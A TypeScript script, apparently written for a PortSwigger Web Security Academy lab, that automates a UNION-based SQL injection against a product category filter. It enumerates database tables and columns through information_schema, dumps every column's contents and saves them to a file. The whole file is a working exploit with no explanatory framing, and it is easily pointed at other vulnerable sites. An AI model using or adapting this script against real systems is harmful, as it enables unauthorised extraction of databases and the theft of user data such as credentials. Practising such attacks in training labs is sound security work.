import { parse } from "node-html-parser";
import axios from "axios";
import * as fs from "fs";

const subDomain = "0abb007f0401a3d5c038e13700a000e3";
const fullWebAddress = `https://${subDomain}.web-security-academy.net/`;
const queryPrefix = `filter?category=Gifts`;

const retrieveAllTablesSQLInjection = encodeURI(
  `' UNION SELECT TABLE_NAME,TABLE_TYPE FROM information_schema.tables--`
);

const generatedRetrieveAllColumnsSQLInjectionURLQuery = (
  tableName: string,
  filterString: string
) =>
  encodeURI(
    `' UNION SELECT COLUMN_NAME,DATA_TYPE FROM information_schema.columns WHERE TABLE_NAME='${tableName}' ${filterString}--`
  );

const generatedRetrieveContentSQLInjectionURLQuery = (
  tableName: string,
  columnName: string
) =>
  encodeURI(`' UNION SELECT ${columnName},${columnName} FROM ${tableName}--`);

const retrieveAllColumnsContent = async () => {
  const allTableNames = await retrieveAllTableNames();
  console.log("test");
  const tableContent = {};
  const dataTypes = {};
  allTableNames.forEach((tableName) => (tableContent[tableName] = {}));
  try {
    for (let tableName of allTableNames) {
      const tableColumns = await retrieveAllColumns(tableName);
      for (let tableColumn of tableColumns) {
        const retrieveContentSQLInjectionURLQuery =
          generatedRetrieveContentSQLInjectionURLQuery(tableName, tableColumn);
        const retrieveContentInjectionURL =
          fullWebAddress + queryPrefix + retrieveContentSQLInjectionURLQuery;
        try {
          const response = await axios.get(retrieveContentInjectionURL);
          const allContent = extractAllHTMLTableHeadText(response.data);
          const allDataTypes = extractAllHTMLTableRowText(response.data);
          allDataTypes.forEach((dataType) => (dataTypes[dataType] = ""));
          tableContent[tableName][tableColumn] = allContent;
          console.log(allContent);
          console.log(tableContent);
          console.log(allDataTypes);
        } catch (e) {
          console.log(e);
          continue;
        }
      }
    }
  } catch (e) {
    throw e;
  }
  tableContent["dataTypes"] = dataTypes;
  console.log(tableContent);
  fs.writeFileSync("dump.txt", JSON.stringify(tableContent, null, 2));
};

const retrieveAllTableNames = async (): Promise<string[]> => {
  const retrieveTablesInjectionURL =
    fullWebAddress + queryPrefix + retrieveAllTablesSQLInjection;
  const response = await axios.get(retrieveTablesInjectionURL);
  const allTableNames = extractAllHTMLTableHeadText(response.data);
  return allTableNames;
};

const retrieveAllColumns = async (
  tableName: string,
  dataTypeToFilter?: string
): Promise<string[]> => {
  let filterString = "";
  if (dataTypeToFilter === "string") {
    filterString = "AND DATA_TYPE IN ('text','varchar','char')";
  }
  const retrieveAllColumnsSQLInjectionURLQuery =
    generatedRetrieveAllColumnsSQLInjectionURLQuery(tableName, filterString);
  const retrieveColumnsInjectionURL =
    fullWebAddress + queryPrefix + retrieveAllColumnsSQLInjectionURLQuery;
  try {
    const response = await axios.get(retrieveColumnsInjectionURL);
    const allColumnNames = extractAllHTMLTableHeadText(response.data);
    console.log(allColumnNames);
    return allColumnNames;
  } catch (e) {
    throw e;
  }
};

const extractAllHTMLTableHeadText = (htmlResponse: string) => {
  const parsedHTML = parse(htmlResponse);
  const allTableHeadElements = parsedHTML.querySelectorAll("th");

  const tableHeadsText = allTableHeadElements.map((tableHeadObj) => {
    return tableHeadObj.rawText;
  });
  //   console.log(allColumnNames);
  return tableHeadsText;
};

const extractAllHTMLTableRowText = (htmlResponse: string) => {
  const parsedHTML = parse(htmlResponse);
  const allTableRowElements = parsedHTML.querySelectorAll("tr");

  const tableRowsText = allTableRowElements.map((tableHeadObj) => {
    return tableHeadObj.rawText;
  });
  //   console.log(allColumnNames);
  return tableRowsText;
};

try {
  retrieveAllColumnsContent();
} catch (e) {
  console.log(e);
  throw e;
}
// Get all table head contents and query each table for their columns

// Get all table head contents containing the columns and query each column containing a varchar type
// Save the contents into a text file
